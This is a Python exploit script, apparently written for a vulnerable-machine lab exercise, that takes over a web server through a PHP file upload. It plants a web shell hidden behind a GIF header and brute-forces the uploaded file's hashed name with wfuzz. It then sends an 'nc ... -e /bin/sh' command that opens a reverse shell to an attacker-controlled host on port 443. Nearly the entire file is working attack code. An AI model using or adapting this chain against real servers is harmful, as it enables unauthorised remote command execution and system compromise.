#dependency pip install wfuzz==2.2.0
# https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php
# wfuzz -w test.txt --hc 404 http://192.168.0.163:8000/uploads/FUZZ.php
import hashlib
import requests
import wfuzz
import re

fileName = "cmd.php"
fuzzFile = "test.txt"
baseURL = "http://192.168.0.163:8000"
LHOST = "192.168.0.103"
LPORT = "443"

#createFile
def createPayload():
    file = open(fileName, "w+")
    file.write("GIF89a;\n")
    file.write("<?php system($_REQUEST['cmd']); ?>")
    file.close()

def uploadPayload():
    host = baseURL + "/upload.php"
    files = {'file': open(fileName, 'rb')}
    param = {"submit":"Submit"}
    r = requests.post(host, files=files, data=param)

#Based on https://github.com/fatihhcelik/Vulnerable-Machine---Hint/blob/master/upload.php
def createFuzzFile():
    file = open(fuzzFile,"w+")
    for i in range(0, 100):
        fName = fileName
        fName += str(i)
        file.write(hashlib.md5(fName.encode()).hexdigest()+ "\n")
    file.close()

def fuzzing():
    fuz = wfuzz.FuzzSession(url = baseURL + "/uploads/FUZZ.php" )
    temp = ""
    for req in fuz.fuzz(hc = [404], payloads = [("file", dict(fn = fuzzFile))]):
        temp = req
    filePath = str(re.findall(r'"([^"]*)"', str(temp))[0])+".php?cmd=nc "+LHOST+" "+LPORT + " -e /bin/sh"
    exploit(baseURL + "/uploads/" + filePath)


def exploit(url):
    print url
    req = requests.get(url)
    print "Fine"

def main():
    createPayload()
    uploadPayload()
    createFuzzFile()
    fuzzing()


if __name__ == '__main__':
    main()

